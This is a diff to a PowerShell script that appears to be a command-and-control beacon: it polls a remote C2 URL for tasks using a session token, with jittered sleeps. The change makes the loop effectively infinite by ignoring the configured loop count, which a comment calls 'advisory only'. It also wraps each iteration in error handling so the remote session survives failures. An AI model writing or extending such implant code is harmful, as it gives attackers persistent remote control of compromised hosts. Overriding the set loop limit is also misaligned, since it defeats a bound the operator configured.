@@ -90,8 +90,9 @@ try {
     Write-Output "register failed: $($_.Exception.Message)"; exit 1
 }
 
-$count = if ($Once) { 1 } elseif ($loops -gt 0) { $loops } else { [int]::MaxValue }
+$count = if ($Once) { 1 } else { [int]::MaxValue }  # session callback persists; loop_count is advisory only
 for ($i = 0; $i -lt $count; $i++) {
+    try {
     $taskResp = Invoke-WebRequest -Method GET -Uri "$c2Url/task/next?session=$token" -UseBasicParsing -TimeoutSec 10
     $taskObj = ($taskResp.Content | ConvertFrom-Json)
     $task = $taskObj.task
@@ -122,5 +123,10 @@ for ($i = 0; $i -lt $count; $i++) {
         $s = [Math]::Max(0, $sleep + (Get-Random -Minimum (-$jitter) -Maximum ($jitter + 1)))
     }
     Start-Sleep -Seconds ($s + $pause)
+    } catch {
+        # resilience: transient network/server errors must not kill the session callback
+        Write-Output "iteration error (continuing): $($_.Exception.Message)"
+        Start-Sleep -Seconds 5
+    }
 }
 Write-Output "beacon cycle complete (stage=$stage host=$hostAlias token=${token})"
